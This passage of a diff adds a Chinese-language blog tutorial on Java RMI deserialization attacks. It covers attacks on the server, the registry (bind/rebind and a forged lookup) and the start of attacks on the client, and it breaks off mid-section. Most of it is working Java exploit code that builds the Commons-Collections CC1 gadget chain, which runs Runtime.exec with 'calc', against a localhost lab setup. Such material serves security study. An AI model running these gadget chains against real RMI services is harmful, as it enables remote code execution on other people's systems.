<span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>存在的攻击方式有一下三种</p>
+<ul>
+<li>客户端打注册中心</li>
+<li>客户端打服务端</li>
+<li>服务端打客户端</li>
+</ul>
+<h1 id="0x02-攻击利用"><a href="#0x02-攻击利用" class="headerlink" title="0x02 攻击利用"></a>0x02 攻击利用</h1><h2 id="攻击Server端"><a href="#攻击Server端" class="headerlink" title="攻击Server端"></a>攻击Server端</h2><p>首先，<strong>Client</strong>会去获取<strong>Server</strong>端创建的<strong>Stub</strong>，然后在本地调用这个<strong>Stub</strong>并传递参数</p>
+<p>然后<strong>Stub</strong>会序列化这个参数再传递给<strong>Server</strong>端，<strong>Server</strong>端会反序列化这个参数再调用</p>
+<p>如果此时的<strong>Client</strong>传递的参数是个<strong>Object</strong>类型的恶意对象参数</p>
+<p>而且此时的<strong>Server</strong>存在有漏洞的组件，那么就有可能会造成反序列化漏洞</p>
+<p><strong>利用条件</strong></p>
+<ul>
+<li><strong>Server端</strong>存在接收<strong>Object</strong>对象的远程对象方法</li>
+<li><strong>Server端</strong>存在有反序列化漏洞的组件</li>
+</ul>
+<p><strong>服务端</strong></p>
+<ul>
+<li><h3 id="ICalc接口"><a href="#ICalc接口" class="headerlink" title="ICalc接口"></a><strong>ICalc</strong>接口</h3></li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//带有Object类参数的远程对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">ICalc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><h3 id="ICalcImpl实现"><a href="#ICalcImpl实现" class="headerlink" title="ICalcImpl实现"></a><strong>ICalcImpl</strong>实现</h3></li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ICalcImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">ICalcImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ICalc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><h3 id="RMIServer"><a href="#RMIServer" class="headerlink" title="RMIServer"></a><strong>RMIServer</strong></h3></li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ICalcImpl</span> <span class="variable">iCalc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ICalcImpl</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>,iCalc);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>客户端</strong></p>
+<ul>
+<li><h3 id="ICalc接口-1"><a href="#ICalc接口-1" class="headerlink" title="ICalc接口"></a><strong>ICalc</strong>接口</h3></li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//带有Object类参数的远程对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">ICalc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><h3 id="RMIClient"><a href="#RMIClient" class="headerlink" title="RMIClient"></a><strong>RMIClient</strong></h3></li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">iCalc</span> <span class="operator">=</span> (ICalc) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>);</span><br><span class="line">        iCalc.ICalc(Exploit());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//恶意对象CC1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Retention.class, transformedMp);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>运行结果</strong></p>
+<p>成功弹出计算器</p>
+<ul>
+<li><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a><strong>Server</strong></h3></li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//结果输出</span></span><br><span class="line">Registry运行中......</span><br><span class="line">success</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="攻击registry端"><a href="#攻击registry端" class="headerlink" title="攻击registry端"></a>攻击registry端</h2><p>其实攻击的还是与<strong>Registry</strong>交互的几种方式</p>
+<h3 id="调用bind-rebind攻击"><a href="#调用bind-rebind攻击" class="headerlink" title="调用bind&#x2F;rebind攻击"></a>调用bind&#x2F;rebind攻击</h3><p>由前面我们可以知道，当调用<strong>bind&#x2F;rebind</strong>时，会调用<strong>readObject</strong>读出参数名和远程对象，所以就有机会可以利用</p>
+<p>不过由于只能接收<strong>String</strong>和<strong>Remote</strong>类型，而我们生成的恶意类是<strong>Object</strong>类型的</p>
+<p>所以我们需要使用动态代理将<strong>Object</strong>强转为<strong>Remote</strong>类型的参数</p>
+<p>这里需要用到**Remote.class.cast()**这个方法，主要用于将一个对象强制转换为指定类或接口的类型</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">cast</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp; !isInstance(obj))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>(cannotCastMsg(obj));</span><br><span class="line">    <span class="keyword">return</span> (T) obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><h3 id="Server端不变"><a href="#Server端不变" class="headerlink" title="Server端不变"></a><strong>Server</strong>端不变</h3></li>
+<li><h3 id="Client端"><a href="#Client端" class="headerlink" title="Client端"></a><strong>Client</strong>端</h3></li>
+</ul>
+<p><strong>RMIClient</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Registry registry= LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, (Remote) Exploit());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//恶意对象CC1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用动态代理，将其转为Remote对象</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Retention.class, transformedMp);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">RemoteProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, o);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">cast</span> <span class="operator">=</span> Remote.class.cast(RemoteProxy);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMI_Client</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="调用lookup-unbind攻击"><a href="#调用lookup-unbind攻击" class="headerlink" title="调用lookup&#x2F;unbind攻击"></a>调用lookup&#x2F;unbind攻击</h3><p>和<strong>bind&#x2F;rebind</strong>不同的是，<strong>lookup&#x2F;unbind</strong>只能接收<strong>String</strong>类型的参数</p>
+<p>所以我们只能通过重写代码伪造连接请求，使其可以传入对象</p>
+<p>以<strong>lookup</strong>为例</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line">        Remote var23;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">            var23 = (Remote)var6.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><h3 id="Server不变"><a href="#Server不变" class="headerlink" title="Server不变"></a><strong>Server</strong>不变</h3></li>
+<li><h3 id="Client端-1"><a href="#Client端-1" class="headerlink" title="Client端"></a><strong>Client</strong>端</h3></li>
+</ul>
+<p>伪造<strong>lookup</strong>方法，模拟通信过程，并传入恶意信息</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取Registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取ref</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">refDeclareFiled</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refDeclareFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) refDeclareFiled.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">operationsDeclaredField</span> <span class="operator">=</span> registry.getClass().getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        operationsDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) operationsDeclaredField.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//伪造lookup代码，伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(Exploit());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用动态代理，将其转为Remote对象</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Retention.class, transformedMp);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">RemoteProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, o);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">cast</span> <span class="operator">=</span> Remote.class.cast(RemoteProxy);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient2</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="攻击Client端"><a href="#攻击Client端" class="headerlink" title="攻击Client端"></a>攻击Client端</h2><h3 id="Server攻击Client"><a href="#Server攻击Client" class="headerlink" title="Server攻击Client"></a>Server攻击Client</h3><p>在<strong>rmi</strong>通信过程中，<strong>Server</strong>会把远程方法执行的结果返回给<strong>Client</strong>，如果返回的是一个对象，那么就会先序列化这个对象，在传递给<strong>Client</strong>，并且在<strong>Client</strong>反序列化</p>
+<p>如果返回恶意对象，就有机会达成攻击</p>
+<ul>
+<li><h3 id="Server端"><a href="#Server端" class="headerlink" title="Server端"></a><strong>Server</strong>端</h3></li>
+<li><p><strong>ICalc</strong>接口</p>
+</li>
+</ul>
